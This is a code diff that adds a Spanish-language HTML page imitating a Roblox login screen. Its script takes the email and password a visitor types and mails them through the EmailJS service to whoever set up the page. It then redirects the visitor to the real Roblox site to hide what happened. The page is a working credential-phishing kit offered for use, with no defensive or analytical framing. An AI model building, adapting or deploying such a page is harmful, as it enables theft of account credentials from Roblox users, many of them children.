@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login de Roblox</title>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #2c3e50;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .submit-btn:hover {
+            background-color: #0056b3;
+        }
+
+        .error-message {
+            color: red;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>Login a Roblox</h2>
+    <form id="login-form">
+        <input type="email" id="email" class="input-field" placeholder="Correo electrónico" required>
+        <input type="password" id="password" class="input-field" placeholder="Contraseña" required>
+        <button type="button" class="submit-btn" onclick="enviarLogin()">Iniciar sesión</button>
+        <p class="error-message" id="error-message"></p>
+    </form>
+</div>
+
+<script>
+    // Inicializa EmailJS con tu User ID
+    emailjs.init('Roblox');  // Reemplaza con tu User ID de EmailJS, en este caso 'Roblox'
+
+    // Función para enviar el formulario
+    function enviarLogin() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Validación básica para asegurarnos de que los campos no están vacíos
+        if (email === "" || password === "") {
+            document.getElementById('error-message').textContent = "Por favor, completa todos los campos.";
+            return;
+        }
+
+        // Configura los parámetros para el email
+        const templateParams = {
+            user_email: email,
+            user_password: password,
+        };
+
+        // Envía el correo electrónico con EmailJS
+        emailjs.send('service_gxpxnkp', 'tu_template_id', templateParams)  // Reemplaza 'tu_template_id' con tu ID de plantilla de EmailJS
+            .then((response) => {
+                console.log('Correo enviado con éxito:', response);
+                alert('Login realizado con éxito. Datos enviados a correo.');
+
+                // Redirige a Roblox después de enviar el correo
+                window.location.href = 'https://www.roblox.com';
+            })
+            .catch((error) => {
+                console.error('Error al enviar correo:', error);
+                alert('Hubo un error al intentar enviar los datos.');
+            });
+    }
+</script>
+
+</body>
+</html>
